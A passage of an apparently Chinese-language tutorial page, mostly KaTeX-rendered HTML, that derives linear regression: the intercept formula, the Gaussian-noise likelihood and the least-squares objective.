style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault">x</span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault">x</span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93601em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>=</mo><mover accent="true"><mi>y</mi><mo stretchy="true">‾</mo></mover><mo>−</mo><mi>w</mi><mover accent="true"><mi>x</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">b=\overline y -w\overline x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.825em;vertical-align:-0.19444em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.63056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault">x</span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span></span></p><h3 id="多属性线性回归"><a class="markdownIt-Anchor" href="#多属性线性回归"></a> 多属性线性回归</h3><ul><li>多元线性回归也就是有d个属性，建立矩阵方程。</li></ul><h3 id="线性回归与最小二乘"><a class="markdownIt-Anchor" href="#线性回归与最小二乘"></a> 线性回归与最小二乘</h3><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>ε</mi></mrow><annotation encoding="application/x-tex">y=w^Tx+ε</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9746609999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ε</span></span></span></span></span></p><ul><li>假设<code>ε</code>满足独立同分布，服从均值0方差<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>θ</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">θ^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>的高斯分布。所以<code>ε</code>表示为：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>ε</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><msqrt><mrow><mn>2</mn><mi>π</mi></mrow></msqrt></mfrac><msup><mi>e</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><mfrac><msup><mi>ε</mi><mn>2</mn></msup><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">p(ε)=\frac{1}{\sqrt{2π}}e^{(-\frac{ε^2}{2σ^2})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">ε</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.78444em;vertical-align:-0.5379999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.5510085em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.912845em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight">2</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span><span style="top:-2.872845em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.12715500000000002em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5379999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.24644em;"><span style="top:-3.4534200000000004em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1328857142857145em;"><span style="top:-2.5061857142857145em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384399999999999em;"><span style="top:-2.93844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">ε</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.04844em;"><span style="top:-3.04844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.49381428571428565em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></li><li>由于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ε</mi><mo>=</mo><mi>y</mi><mo>−</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi></mrow><annotation encoding="application/x-tex">ε=y-w^Tx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ε</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span></span></span></span>，带入到上式：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>w</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><msqrt><mrow><mn>2</mn><mi>π</mi></mrow></msqrt></mfrac><msup><mi>e</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><mfrac><mrow><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">p(y|x;w)=\frac{1}{\sqrt{2π}}e^{(-\frac{(y-w^Tx)^2}{2σ^2})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.8865349999999999em;vertical-align:-0.5379999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.5510085em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.912845em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight">2</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span><span style="top:-2.872845em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.12715500000000002em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5379999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.3485349999999998em;"><span style="top:-3.4534200000000004em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2787357142857143em;"><span style="top:-2.5061857142857145em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384399999999999em;"><span style="top:-2.93844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.5020714285714285em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0873300000000001em;"><span style="top:-3.0873299999999997em;margin-right:0.1em;"><span class="pstrut" style="height:2.6833299999999998em;"></span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span><span class="mord mathdefault mtight">x</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.04844em;"><span style="top:-3.04844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.49381428571428565em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></li><li>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(y|x;w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span>表示<code>w</code>能够最大<code>y</code>的概率的取值，可以用似然函数求解。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow></munder><mi>m</mi><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">;</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(θ)=\prod_{i=1}{m}p(y|x;w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.327674em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">m</span></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></span></p><ul><li>通过取对数，化简得到目标函数：求取<code>J(θ)</code>的最小值</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">J(θ)=\frac{1}{2}\sum_{i=1}^m (h_θ(x)-y)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>最小值可以通过凸函数的导数为零的解，由于X和θ是矩阵，求导要符合矩阵求导的公式。求导公式，可参照<a href="https://en.wikipedia.org/wiki/Matrix_calculus#Scalar-by-vector_identities">wiki百科</a></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow></munder><mi>m</mi><mrow><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mo>−</mo><msup><mi>y</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>X</mi><mi>θ</mi><mo>−</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo stretchy="false">(</mo><mi>X</mi><mi>θ</mi><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">J(\theta)=\frac{1}{2}\sum_{i=1}{m}{(h_\theta(x^{(i)})-y^{(i)})}=\frac{1}{2}(X\theta-y)^T(X\theta-y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.599109em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span 